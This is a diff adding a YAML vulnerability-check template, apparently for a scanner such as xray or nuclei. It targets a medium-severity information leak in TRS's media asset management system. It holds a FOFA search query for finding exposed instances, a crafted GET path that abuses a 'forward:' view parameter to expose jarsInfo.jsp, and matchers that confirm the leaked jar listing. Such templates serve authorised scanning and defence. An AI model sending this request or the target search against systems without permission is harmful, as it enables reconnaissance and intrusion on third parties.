@@ -1,0 +1,19 @@
+id: poc-yaml-trs-jarsInfo-leak
+info:
+  name: 拓尔思 TRS媒资管理系统 jarsInfo.jsp 信息泄露
+  severity: medium
+  tags:
+  - 两高一弱
+  - 信息泄露
+  finger: TRS媒资管理系统
+  fofa: body="北京拓尔思信息技术股份有限公司"
+requests:
+- method: GET
+  path: /mas/front/vod/main.do?method=newList&view=forward:/sysinfo/jarsInfo.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  expression: "status_code == 200 && \ncontains(body,\"Jar文件信息\") &&\ncontains(body,\"\
+    序号\") &&\ncontains(body,\"文件\") &&\ncontains(body,\"大小\") &&\ncontains(body,\"\
+    时间\") &&\ncontains(body,\"jar中的名称和版本\")\n"
+variables: {}
+transport: http
